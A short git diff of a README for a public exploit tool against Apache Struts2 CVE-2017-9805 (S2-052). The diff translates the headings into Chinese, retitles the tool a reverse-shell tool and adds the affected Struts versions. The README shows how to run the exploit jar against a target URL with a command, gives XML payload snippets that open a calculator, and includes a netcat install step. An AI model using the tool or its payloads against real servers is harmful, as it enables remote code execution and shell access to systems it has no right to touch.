@@ -1,6 +1,15 @@
-# CVE-2017-9805 （S2-052） Exploit For Nc
+# CVE-2017-9805 （S2-052）反弹Shell工具
 
-## Options
+## 影响版本
+```
+Struts 2.1.2 - Struts 2.3.33, Struts 2.5 - Struts 2.5.12
+```
+
+## 漏洞详情
+
+https://secfree.com/article-333.html
+
+## 选项
 
 ```
  [*] Apache Struts2 CVE-2017-9805 (S2-052) - Exploit
@@ -9,7 +18,7 @@
  [*] Author:  www.secFree.com Team By Bearcat
 ```
 
-## Usage
+## 使用
 
 ```
 java -jar CVE-2017-9805-Exploit.jar http://192.168.199.246:8080/struts2-rest-showcase/orders.xhtml "command"
@@ -33,7 +42,7 @@ Windows <command><string>calc</string></command>
 Mac <command><string>/Applications/Calculator.app/Contents/MacOS/Calculator</string></command>
 ```
 
-##  CentOS7 Install Nc
+##  CentOs 7 安装 Nc
 ```
 rpm -ivh netcat-1.10-891.2.x86_64.rpm
 ```
